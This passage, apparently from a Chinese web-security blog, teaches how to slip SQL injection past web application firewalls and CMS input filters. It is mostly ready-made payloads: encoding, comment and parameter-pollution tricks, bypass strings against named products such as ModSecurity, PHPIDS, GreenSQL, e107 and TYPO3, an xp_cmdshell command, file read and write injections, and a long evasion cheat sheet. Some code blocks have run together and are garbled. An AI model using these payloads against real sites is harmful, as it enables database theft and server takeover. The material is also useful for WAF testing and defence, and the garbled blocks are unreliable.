operator">&amp;</span>黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活状态管理：重点进行会话保护另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等如果是对于扫描器，WAF有其识别之道：</code></pre><p>扫描器识别主要由以下几点：</p><pre class=" language-bash"><code class="language-bash">1.  扫描器指纹<span class="token punctuation">(</span>head字段/请求参数值<span class="token punctuation">)</span>，以wvs为例，会有很明显的Acunetix在内的标识 2.  单IP+ cookie某时间段内触发规则次数 3.  隐藏的链接标签等<span class="token punctuation">(</span><span class="token punctuation">)</span> 4.  Cookie植入 5.  验证码验证，扫描器无法自动填充验证码 6.  单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404 </code></pre><h3 id="三、绕过WAF的方法"><a href="#三、绕过WAF的方法" class="headerlink" title="三、绕过WAF的方法"></a><font size="5"><strong>三、绕过WAF的方法</strong></font></h3><p>从目前能找到的资料来看，我把这些绕过waf的技术分为9类，包含从初级到高级技巧</p><pre class=" language-bash"><code class="language-bash">a<span class="token punctuation">)</span> 大小写混合b<span class="token punctuation">)</span>替换关键字c<span class="token punctuation">)</span>使用编码d<span class="token punctuation">)</span>使用注释e<span class="token punctuation">)</span>等价函数与命令f<span class="token punctuation">)</span>特殊符号g<span class="token punctuation">)</span>HTTP参数控制h<span class="token punctuation">)</span>缓冲区溢出i<span class="token punctuation">)</span>整合绕过</code></pre><h4 id="a-大小写绕过"><a href="#a-大小写绕过" class="headerlink" title="a) 大小写绕过"></a><font size="4"><strong>a) 大小写绕过</strong></font></h4><p>大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式&#x2F;express&#x2F;i 大小写不敏感即无法绕过，这是最简单的绕过技术</p><p>举例：z.com&#x2F;index.php?page_id&#x3D;-15 uNIoN sELecT 1,2,3,4</p><p>示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理</p><h4 id="b-替换关键字"><a href="#b-替换关键字" class="headerlink" title="b)替换关键字"></a><font size="4"><strong>b)替换关键字</strong></font></h4><p>这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p><p>举例：z.com&#x2F;index.php?page_id&#x3D;-15 UNIunionON SELselectECT 1,2,3,4</p><p>同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望</p><h4 id="c-使用编码"><a href="#c-使用编码" class="headerlink" title="c)使用编码"></a><font size="4"><strong>c)使用编码</strong></font></h4><p>1.URL编码</p><p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29</p><p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id&#x3D;1%252f%252a*&#x2F;UNION%252f%252a &#x2F;SELECT</p><p>2.十六进制编码</p><p>举例：z.com&#x2F;index.php?page_id&#x3D;-15 &#x2F;!u%6eion&#x2F; &#x2F;!se%6cect&#x2F; 1,2,3,4…</p><p>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</p><p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p><p>3.Unicode编码</p><p>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p><p>看一下常用的几个符号的一些Unicode编码：</p><p>单引号:  %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p><p>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p><p>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p><p>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p><p>举例：?id&#x3D;10%D6‘%20AND%201&#x3D;2%23</p><p>SELECT ‘Ä’&#x3D;’A’; #1</p><p>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p><p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p><p>另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下</p><p>常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子</p><h4 id="d-使用注释"><a href="#d-使用注释" class="headerlink" title="d) 使用注释"></a><font size="4"><strong>d) 使用注释</strong></font></h4><p>看一下常见的用于注释的符号有哪些：*&#x2F;&#x2F;, – , &#x2F;&#x2F;, #, –+,–  -, ;，–a</p><p>1.普通注释</p><p>举例：z.com&#x2F;index.php?page_id&#x3D;-15 %55nION&#x2F;**&#x2F;%53ElecT 1,2,3,4</p><p>‘union%a0select pass from users#</p><p>&#x2F;**&#x2F;在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p><p>2.内联注释</p><p>相比普通注释，内联注释用的更多，它有一个特性&#x2F;!**&#x2F;只有MySQL能识别</p><p>举例：index.php?page_id&#x3D;-15 &#x2F;!UNION&#x2F; &#x2F;!SELECT&#x2F; 1,2,3</p><p>?page_id&#x3D;null%0A&#x2F;&#x2F;&#x2F;!50000%55nIOn&#x2F;&#x2F;yoyu&#x2F;all&#x2F;&#x2F;%0A&#x2F;!%53eLEct&#x2F;%0A&#x2F;nnaa&#x2F;+1,2,3,4…</p><p>两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括&#x2F;、*在内的这些字符能正常使用</p><h4 id="e-等价函数与命令"><a href="#e-等价函数与命令" class="headerlink" title="e)等价函数与命令"></a><font size="4"><strong>e)等价函数与命令</strong></font></h4><p>有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p><p>1.函数或变量</p><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()</p><p>sleep() &#x3D;&#x3D;&gt;benchmark()</p><p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p><p>mid()、substr() &#x3D;&#x3D;&gt; substring()</p><p>@@user  &#x3D;&#x3D;&gt; user() </p><p>@@datadir  &#x3D;&#x3D;&gt; datadir() </p><p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74</p><p>或者：substr((select ‘password’),1,1) &#x3D; 0x70</p><p>strcmp(left(‘password’,1), 0x69) &#x3D; 1</p><p>strcmp(left(‘password’,1), 0x70) &#x3D; 0</p><p>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p><p>上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论</p><p>2.符号</p><p>and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有&#x3D;不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了</p><p>在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F;</p><p>3.生僻函数</p><p>MySQL&#x2F;PostgreSQL支持XML函数：Select UpdateXML(‘ ’,’&#x2F;script&#x2F;@x&#x2F;’,’src&#x3D;&#x2F;&#x2F;evil.com’);</p><p>?id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</p><p>SELECT xmlelement(name img,xmlattributes(1as src,’a\l\x65rt(1)’as \117n\x65rror));　&#x2F;&#x2F;postgresql</p><p>?id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制</p><h4 id="f-特殊符号"><a href="#f-特殊符号" class="headerlink" title="f) 特殊符号"></a><font size="4"><strong>f) 特殊符号</strong></font></h4><p>这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多</p><p>先看下乌云drops上“waf的绕过技巧”一文使用的几个例子：</p><p>1.使用反引号，例如selectversion()&#96;，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p><p>2.神奇的”-+.”，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</p><p>3.@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</p><p>4.Mysql function() as xxx 也可不用as和空格　　 select-count(id)test from users;  &#x2F;&#x2F;绕过空格限制</p><p>可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到</p><p>本人搜罗了部分可能发挥大作用的字符(未包括’、*、&#x2F;等在内，考虑到前面已经出现较多次了)：&#96;、~、!、@、%、()、[]、.、-、+ 、|、%00</p><p>举例：</p><p>关键字拆分：‘se’+’lec’+’t’</p><p>%S%E%L%E%C%T 1</p><p>1.aspx?id&#x3D;1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell ”net user”’)</p><p>!和()：’ or –+2&#x3D;- -!!!’2</p><p>id&#x3D;1+(UnI)(oN)+(SeL)(EcT)　&#x2F;&#x2F;另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔</p><p>本节最后在给出一些和这些字符多少有点关系的操作符供参考：</p><blockquote><blockquote><p>, &lt;&lt;, &gt;&#x3D;, &lt;&#x3D;, &lt;&gt;,&lt;&#x3D;&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN</p></blockquote></blockquote><p>使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p><h4 id="g-HTTP参数控制"><a href="#g-HTTP参数控制" class="headerlink" title="g) HTTP参数控制"></a><font size="4"><strong>g) HTTP参数控制</strong></font></h4><p>这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><p>1.HPP(HTTP Parameter Polution)</p><p>举例：&#x2F;?id&#x3D;1;select+1,2,3+from+users+where+id&#x3D;1—</p><p>&#x2F;?id&#x3D;1;select+1&amp;id&#x3D;2,3+from+users+where+id&#x3D;1—</p><p>&#x2F;?id&#x3D;1&#x2F;**&#x2F;union&#x2F;&amp;id&#x3D;&#x2F;select&#x2F;&amp;id&#x3D;&#x2F;pwd&#x2F;&amp;id&#x3D;&#x2F;from&#x2F;&amp;id&#x3D;&#x2F;users</p><p>HPP又称做重复参数污染，最简单的就是?uid&#x3D;1&amp;uid&#x3D;2&amp;uid&#x3D;3，对于这种情况，不同的Web服务器处理方式如下：<br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/1.png"></p><p>具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过</p><p>2.HPF(HTTP Parameter Fragment)</p><p>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p><p>举例：</p><p>&#x2F;?a&#x3D;1+union&#x2F;&amp;b&#x3D;&#x2F;select+1,pass&#x2F;&amp;c&#x3D;&#x2F;from+users–</p><p>select  from table where a&#x3D;1 union&#x2F; and b&#x3D;&#x2F;select 1,pass&#x2F; limit *&#x2F;from users—</p><p>看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p><p>3.HPC(HTTP Parameter Contamination)</p><p>这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染</p><p>RFC2396定义了如下一些字符：</p><p>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ‘ ()<br>Reserved : ; &#x2F; ? : @ &amp; &#x3D; + $ ,<br>Unwise : { } | \ ^ [ ] &#96;</p><p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：<br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/2.png"></p><p>以魔术字符%为例，Asp&#x2F;Asp.net会受到影响<br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/3.png"></p><h4 id="h-缓冲区溢出-Advanced"><a href="#h-缓冲区溢出-Advanced" class="headerlink" title="h) 缓冲区溢出(Advanced)"></a><font size="4"><strong>h) 缓冲区溢出(Advanced)</strong></font></h4><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p><p>举例：</p><p>?id&#x3D;1 and (select 1)&#x3D;(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p><p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p><h4 id="i-整合绕过"><a href="#i-整合绕过" class="headerlink" title="i) 整合绕过"></a><font size="4"><strong>i) 整合绕过</strong></font></h4><p>整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p><p>举例：</p><pre class=" language-bash"><code class="language-bash">z.com/index.php?page_id<span class="token operator">=</span>-15+and+<span class="token punctuation">(</span>select 1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span>Select 0xAA<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">(</span>add about 1000 <span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">)</span>+/*<span class="token operator">!</span>uNIOn*/+/*<span class="token operator">!</span>SeLECt*/+1,2,3,4…id<span class="token operator">=</span>1/*<span class="token operator">!</span>UnIoN*/+SeLeCT+1,2,concat<span class="token punctuation">(</span>/*<span class="token operator">!</span>table_name*/<span class="token punctuation">)</span>+FrOM /*information_schema*/.tables /*<span class="token operator">!</span>WHERE */+/*<span class="token operator">!</span>TaBlE_ScHeMa*/+like+database<span class="token punctuation">(</span><span class="token punctuation">)</span>– -?id<span class="token operator">=</span>-725+/*<span class="token operator">!</span>UNION*/+/*<span class="token operator">!</span>SELECT*/+1,GrOUp_COnCaT<span class="token punctuation">(</span>COLUMN_NAME<span class="token punctuation">)</span>,3,4,5+FROM+/*<span class="token operator">!</span>INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME<span class="token operator">=</span>0x41646d696e--  </code></pre><h3 id="三、SQLi-Filter的实现及Evasion"><a href="#三、SQLi-Filter的实现及Evasion" class="headerlink" title="三、SQLi Filter的实现及Evasion"></a><font size="5"><strong>三、SQLi Filter的实现及Evasion</strong></font></h3><p>SQL Injection时用得最多的一些关键字如下：and, or, union, where, limit, group by, select, ‘, hex, substr, white space<br>对它们的检测，完整正则表达式为：preg_match(‘&#x2F;(and|or|union|where|limit|group by|select|’|hex|substr|\s)&#x2F;i’, $id)<br>其应对方式依次为：</p><pre class=" language-bash"><code class="language-bash">***note***:<span class="token string">"=>"</span>左边表示会被Filtered的语句，<span class="token string">"=>"</span>右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字and <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;&amp;</span> 　　or <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">||</span>union <span class="token keyword">select</span> user, password from <span class="token function">users</span>　　 <span class="token operator">=</span><span class="token operator">></span>　　1 <span class="token operator">||</span> <span class="token punctuation">(</span>select user from <span class="token function">users</span> where user_id <span class="token operator">=</span> 1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin1 || (select user from users where user_id = 1) = '</span>admin<span class="token string">'　　=>　　1 || (select user from users limit 1) = '</span>admin1 <span class="token operator">||</span> <span class="token punctuation">(</span>select user from <span class="token function">users</span> limit 1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">=</span><span class="token operator">></span>　　1 <span class="token operator">||</span> <span class="token punctuation">(</span>select user from <span class="token function">users</span> group by user_id having user_id <span class="token operator">=</span> 1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span>1 <span class="token operator">||</span> <span class="token punctuation">(</span>select user from <span class="token function">users</span> group by user_id having user_id <span class="token operator">=</span> 1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">=</span><span class="token operator">></span>　1 <span class="token operator">||</span> <span class="token punctuation">(</span>select substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span> user from <span class="token function">users</span> <span class="token punctuation">)</span><span class="token operator">=</span>11 <span class="token operator">||</span> <span class="token punctuation">(</span>select substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span> user from users<span class="token punctuation">)</span> <span class="token operator">=</span> 1 <span class="token operator">=</span><span class="token operator">></span>1 <span class="token operator">||</span> 1 <span class="token operator">=</span> 1 into outfile <span class="token string">'result.txt'</span>　或者  1 <span class="token operator">||</span> substr<span class="token punctuation">(</span>user,1,1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'a'</span>　1 <span class="token operator">||</span> <span class="token punctuation">(</span>select substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span> user from users<span class="token punctuation">)</span> <span class="token operator">=</span> 1 　<span class="token operator">=</span><span class="token operator">></span>　　1 <span class="token operator">||</span> user_id is not null 或者 1 <span class="token operator">||</span> substr<span class="token punctuation">(</span>user,1,1<span class="token punctuation">)</span> <span class="token operator">=</span> 0x61　　　或者 1 <span class="token operator">||</span> substr<span class="token punctuation">(</span>user,1,1<span class="token punctuation">)</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span>61<span class="token punctuation">)</span>　　//　<span class="token string">' Filtered1 || substr(user,1,1) = unhex(61)　　=>1 || substr(user,1,1) = lower(conv(11,10,36))1 || substr(user,1,1) = lower(conv(11,10,36)) =>　　1 || lpad(user,7,1)1 || lpad(user,7,1)　　=>　　1%0b||%0blpad(user,7,1)　　// '</span> ' Filtered</code></pre><p>从上面给出的示例来看，没有绝对的过滤，即便平时构建一个正常SQL语句的全部关键字都被过滤了，我们也还是能找到Bypass的方法。普世的阳光和真理尚且照不到每一个角落，人为构建出来的一个工具WAF就更加不可能尽善尽美了。我们可以相信WAF能为我们抵挡很多攻击，但是绝不能百分之一百的依赖它，就算它有着世上最为健全的规则，它本身也是会存在缺陷的。<br>从前面到现在，基本上每条注入语句中都有数字，如果某查询的数据类型为字符串、或者做了严格限制数字要被和谐掉，这就有点棘手了，不过办法总是有的：<br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/4.png"><br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/5.png"></p><p>上面两张图，第一张是不能使用数字时通过使用数学函数得到某个数字的值，第二章则是这些数字对应的36进制的值，因此有时候一个很简单的表达式可能会很复杂或者非常长，其实际就是计算mod(a,b)：</p><h3 id="四、延伸及测试向量示例"><a href="#四、延伸及测试向量示例" class="headerlink" title="四、延伸及测试向量示例"></a><font size="5"><strong>四、延伸及测试向量示例</strong></font></h3><p>a) CMS绕过实例<br>b) WAF绕过示例<br>c) SQLi Filter Evasion Cheat sheet<br>d) 测试向量</p><ol><li>e107 CMS</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token variable">$inArray</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">"'"</span>, <span class="token string">";"</span>, <span class="token string">"/**/"</span>, <span class="token string">"/UNION/"</span>, <span class="token string">"/SELECT/"</span>, <span class="token string">"AS "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>strpos<span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span>, <span class="token string">"trackback"</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> false<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; </span>foreach<span class="token punctuation">(</span><span class="token variable">$inArray</span> as <span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; </span>if<span class="token punctuation">(</span>stristr<span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span>, <span class="token variable">$res</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; </span>die<span class="token punctuation">(</span><span class="token string">"Access denied."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;&amp;#125;&amp;#125;</span>Bypass: vuln.php/trackback?inject<span class="token operator">=</span>UNI%6fN SELECT</code></pre><ol start="2"><li>PHP-Nuke CMS</li></ol><pre class=" language-bash"><code class="language-bash">if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">!</span>stripos<span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span>, <span class="token string">"ad_click"</span><span class="token punctuation">))</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; </span><span class="token variable">$queryString</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> stripos<span class="token punctuation">(</span><span class="token variable">$queryString</span>, <span class="token string">'%20union%20'</span><span class="token punctuation">)</span> OR stripos<span class="token punctuation">(</span><span class="token variable">$queryString</span>, <span class="token string">'/*'</span><span class="token punctuation">)</span> OR stripos<span class="token punctuation">(</span><span class="token variable">$queryString</span>, <span class="token string">'*/union/*'</span><span class="token punctuation">)</span> OR stripos<span class="token punctuation">(</span><span class="token variable">$queryString</span>, <span class="token string">'+union+'</span><span class="token punctuation">)</span> OR stripos<span class="token punctuation">(</span><span class="token variable">$queryString</span>, <span class="token string">'concat'</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; die('Illegal Operation'); &amp;#125;</span>Bypass: vuln.php?inject<span class="token operator">=</span>%a0UNI%6fN<span class="token punctuation">(</span>SELECT<span class="token string">'ad_click'</span></code></pre><ol start="3"><li>TYPO3 CMS</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token variable">$val</span> <span class="token operator">=</span> str_replace<span class="token punctuation">(</span>array<span class="token punctuation">(</span><span class="token string">"'"</span>,<span class="token string">" "</span>,<span class="token string">"("</span><span class="token punctuation">)</span>,<span class="token string">""</span>,<span class="token variable">$arrFields</span><span class="token punctuation">[</span><span class="token variable">$fname</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // basic defenceBypass: vuln.php?id<span class="token operator">=</span>1/**/union%a0select/**/1,pass,3<span class="token variable"><span class="token variable">`</span>a<span class="token variable">`</span></span>from<span class="token variable"><span class="token variable">`</span><span class="token function">users</span><span class="token variable">`</span></span></code></pre><h4 id="b-WAF绕过示例"><a href="#b-WAF绕过示例" class="headerlink" title="b) WAF绕过示例"></a><font size="4"><strong>b) WAF绕过示例</strong></font></h4><ol><li>ModSecurity CRS 2.0.9</li></ol><pre class=" language-bash"><code class="language-bash">1<span class="token string">'and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and'</span>11'union/*<span class="token operator">!</span>select*/pass,load_file<span class="token punctuation">(</span>0x123456789<span class="token punctuation">)</span>from users-- -</code></pre><ol start="2"><li>PHPIDS 0.6.4</li></ol><pre class=" language-bash"><code class="language-bash">foo<span class="token string">'!=@a:=0x1 div'</span>1a <span class="token boolean">false</span> <span class="token operator">!=</span> <span class="token boolean">true</span> 　　//auth bypass　foo<span class="token string">'div count(select<span class="token variable"><span class="token variable">`</span>pass<span class="token variable">`</span></span>from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-'</span>0　a<span class="token string">'in(true) and false */*!(true)union#newline select pass<span class="token variable"><span class="token variable">`</span><span class="token function">alias</span><span class="token variable">`</span></span>from users where true*/* n'</span>1</code></pre><ol start="3"><li>GreenSQL 1.3.0</li></ol><p>检测关键字：union, information_schema, into outfile, current_user, current_date, version</p><p>检测函数：mid(), substring(), substr(), load_file(), benchmark(), user(), database(), version()</p><pre class=" language-bash"><code class="language-bash">adm<span class="token string">' '</span><span class="token keyword">in</span><span class="token string">' or 1='</span>1        // auth bypass<span class="token string">'-(1)union(select table_name,load_file('</span>/tmp/test<span class="token string">'),@@versionfrom /*! information_schema.tables */);%00    //select union'</span>-<span class="token string">''</span> into%a0outfile '/tmp/test   //write to <span class="token function">file</span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#注释</span>‘ or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span>‘ or 1<span class="token operator">=</span>1/* <span class="token punctuation">(</span>MySQL <span class="token operator">&lt;</span> 5.1<span class="token punctuation">)</span><span class="token string">' or 1=1;%00'</span> or 1<span class="token operator">=</span>1 union <span class="token keyword">select</span> 1,2 as `<span class="token string">' or#newline'</span> /*<span class="token operator">!</span>50000or*/1<span class="token operator">=</span><span class="token string">'1'</span> /*<span class="token operator">!</span>or*/1<span class="token operator">=</span><span class="token string">'1#前缀+ – ~ !‘ or –+2=- -!!!’2#操作符：^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, , >>, &lt;=, &lt;=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL#空格%20 %09 %0a %0b %0c %0d %a0 /**/‘or+(1)sounds/**/like“1“–%a0-‘union(select(1),tabe_name,(3)from<span class="token variable"><span class="token variable">`</span>information_schema<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>tables<span class="token variable">`</span></span>)##有引号的字符串SELECT ‘a’SELECT “a”SELECT n’a’SELECT b’1100001′SELECT _binary’1100001′SELECT x’61′#没有引号的字符串　‘abc’ = 0×616263　　'</span> and substr<span class="token punctuation">(</span>data,1,1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token comment" spellcheck="true">#　　' and substr(data,1,1) = 0x61# 0x6162　　' and substr(data,1,1) = unhex(61)# unhex(6162)　　' and substr(data,1,1) = char(97)# char(97,98)　　' and substr(data,1,1) = 'a'#　　' and hex(substr(data,1,1)) = 61#　　' and ascii(substr(data,1,1)) = 97#　　' and ord(substr(data,1,1)) = 97# 　　' and substr(data,1,1) = lower(conv(10,10,36))# 'a'</span><span class="token comment" spellcheck="true">#别名</span><span class="token keyword">select</span> pass as <span class="token function">alias</span> from <span class="token function">users</span><span class="token keyword">select</span> pass<span class="token variable"><span class="token variable">`</span><span class="token function">alias</span> <span class="token function">alias</span><span class="token variable">`</span></span>from <span class="token function">users</span><span class="token comment" spellcheck="true">#字型</span>‘ or <span class="token boolean">true</span> <span class="token operator">=</span> ’1 <span class="token comment" spellcheck="true"># or 1=1</span>‘ or round<span class="token punctuation">(</span>pi<span class="token punctuation">(</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>+true+true <span class="token operator">=</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># or 3.1+1+1 = 5.1</span>‘ or ’1 <span class="token comment" spellcheck="true"># or true</span><span class="token comment" spellcheck="true">#操作符字型</span><span class="token keyword">select</span> * from <span class="token function">users</span> where ‘a’<span class="token operator">=</span><span class="token string">'b’='</span>c’<span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token punctuation">(</span>‘a’<span class="token operator">=</span><span class="token string">'b’)=’c’select * from users where (false)=’c’#认真绕过‘=’select * from users where name = ”=”select * from users where false = ”select * from users where 0 = 0select * from users where true#函数过滤器ascii (97)load_file/*foo*/(0×616263)#用函数构建字符串‘abc’ = unhex(616263)‘abc’ = char(97,98,99) hex(‘a’) = 61 ascii(‘a’) = 97 ord(‘a’) = 97‘ABC’ = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))#特殊字符　　aes_encrypt(1,12) // 4鏷眥"^z譎é蒃a　　des_encrypt(1,2) // 侴Ò/镏k　　@@ft_boolean_syntax // + ->&lt;()~*:""&amp;|　　@@date_format // %Y-%m-%d　　@@innodb_log_group_home_dir // .\@@new: 0@@log_bin: 1#提取子字符串substr(‘abc’,1,1) = 